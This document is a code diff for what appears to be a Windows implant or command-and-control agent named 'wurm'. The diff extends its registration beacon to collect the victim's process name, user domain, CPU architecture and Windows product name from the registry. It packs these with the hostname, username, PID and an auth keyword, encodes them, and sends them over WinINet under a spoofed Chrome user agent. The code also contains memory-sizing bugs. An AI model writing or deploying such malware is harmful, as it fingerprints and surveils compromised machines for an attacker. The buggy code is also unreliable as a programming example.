@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <windows.h>
 #include <wininet.h>
+#include <tlhelp32.h>
 
 #define pointer_length 1
 
@@ -89,12 +90,22 @@ typedef BOOL (WINAPI* CRYPTBINARYTOSTRINGA)(
     DWORD      *pcchString
 );
 
+typedef DWORD (WINAPI* GETENVIRONMENTVARIABLEA)(
+    LPCTSTR lpName,
+    LPTSTR  lpBuffer,
+    DWORD   nSize
+);
+
 struct {
     struct {
         char            hostname[MAX_PATH];
         char            username[MAX_PATH];
         DWORD           pid;
+        char*           name;
         DWORD           version;
+        char            arch[MAX_PATH];
+        char            domain[MAX_PATH];
+        char            product[MAX_PATH];
     } info;
     struct {
         char*           address;
@@ -134,6 +145,7 @@ struct {
             INTERNETREADFILE            InternetReadFile;
             INTERNETCLOSEHANDLE         InternetCloseHandle;
             CRYPTBINARYTOSTRINGA        CryptBinaryToStringA;
+            GETENVIRONMENTVARIABLEA     GetEnvironmentVariableA;
         } call;
         struct {
             HMODULE                     kernel32;
@@ -188,9 +200,14 @@ char* get_endpoint() {
 void Register() {
     DWORD hostname_length = 256;
     DWORD username_buffer = 256;
+    DWORD arch_length = 256;
+    DWORD domain_length = 256;
+    DWORD version_length = 256;
+    PROCESSENTRY32 process_info;
+    process_info.dwSize = sizeof(PROCESSENTRY32);
 
     wurm.http.status = "register";
-    wurm.http.format = "%s:%s,%s,%d,%d,%s";
+    wurm.http.format = "%s:%s,%s,%d,%d,%s,%s,%s,%s,%s";
 
     if (internal.win32.call.GetComputerNameA(wurm.info.hostname, &hostname_length)) {
         printf("Hostname: %s\n", wurm.info.hostname);
@@ -204,13 +221,34 @@ void Register() {
         printf("Process ID: %lu\n", wurm.info.pid);
     }
 
-    if (wurm.info.version = internal.win32.call.GetVersion()) {
-        printf("Version: %lu\n", wurm.info.version);
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (Process32First(snapshot, &process_info)) {
+        while (Process32Next(snapshot, &process_info)) {
+            if (wurm.info.pid == process_info.th32ProcessID) {
+                wurm.info.name = process_info.szExeFile;
+                printf("Process Name: %s\n", wurm.info.name);
+            }
+        }
     }
 
+    if (internal.win32.call.GetEnvironmentVariableA("USERDOMAIN", wurm.info.domain, &domain_length)) {
+        printf("Domain: %s\n", wurm.info.domain);
+    }
 
-    CHAR *data_to_encode = malloc(strlen(wurm.http.format) + strlen(wurm.http.status) + strlen(wurm.info.username) + strlen(wurm.info.hostname) + strlen(wurm.auth.keyword));
-    sprintf(data_to_encode, wurm.http.format, wurm.http.status, wurm.info.username, wurm.info.hostname, wurm.info.pid, wurm.info.version, wurm.auth.keyword);
+    if (internal.win32.call.GetEnvironmentVariableA("PROCESSOR_ARCHITECTURE", wurm.info.arch, &arch_length)) {
+        printf("Operating System Arch: %s\n", wurm.info.arch);
+    }
+
+    if (RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\", "ProductName", RRF_RT_REG_SZ, NULL, wurm.info.product, &version_length)) {
+        printf("Main Version: %s\n", wurm.info.product);
+    }
+    
+    if (wurm.info.version = internal.win32.call.GetVersion()) {
+        printf("Build Version: %lu\n", wurm.info.version);
+    }
+
+    CHAR *data_to_encode = malloc(strlen(wurm.http.format) + strlen(wurm.http.status) + strlen(wurm.info.username) + strlen(wurm.info.hostname) + strlen(wurm.info.name) + strlen(wurm.info.domain) + strlen(wurm.info.arch) + strlen(wurm.info.product) + strlen(wurm.auth.keyword));
+    sprintf(data_to_encode, wurm.http.format, wurm.http.status, wurm.info.username, wurm.info.hostname, wurm.info.pid, wurm.info.version, wurm.info.name, wurm.info.domain, wurm.info.arch, wurm.info.product, wurm.auth.keyword);
 
     Encode(data_to_encode);
     Request();
@@ -365,7 +403,8 @@ int main(int argc, char* argv[]) {
     }
     printf("Address: %s\n", wurm.http.address);
     printf("Port:%d\n", wurm.http.port);
-    get_endpoint();
+    // get_endpoint();
+    wurm.http.path = "images";
     printf("Path: %s\n", wurm.http.path);
 
     wurm.http.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
@@ -379,8 +418,9 @@ int main(int argc, char* argv[]) {
     internal.win32.module.wininet = LoadLibraryA("wininet.dll");
     internal.win32.module.crypt32 = LoadLibraryA("crypt32.dll");
 
-    internal.win32.call.GetComputerNameA =              (GETCOMPUTERNAMEA)              GetProcAddress(internal.win32.module.kernel32, "GetComputerNameA");
     internal.win32.call.GetUserNameA =                  (GETUSERNAMEA)                  GetProcAddress(internal.win32.module.advapi32, "GetUserNameA");
+    internal.win32.call.GetEnvironmentVariableA =       (GETENVIRONMENTVARIABLEA)       GetProcAddress(internal.win32.module.kernel32, "GetEnvironmentVariableA");
+    internal.win32.call.GetComputerNameA =              (GETCOMPUTERNAMEA)              GetProcAddress(internal.win32.module.kernel32, "GetComputerNameA");
     internal.win32.call.GetCurrentProcessId =           (GETCURRENTPROCESSID)           GetProcAddress(internal.win32.module.kernel32, "GetCurrentProcessId");
     internal.win32.call.GetVersion =                    (GETVERSION)                    GetProcAddress(internal.win32.module.kernel32, "GetVersion");
     internal.win32.call.InternetOpenA =                 (INTERNETOPENA)                 GetProcAddress(internal.win32.module.wininet, "InternetOpenA");
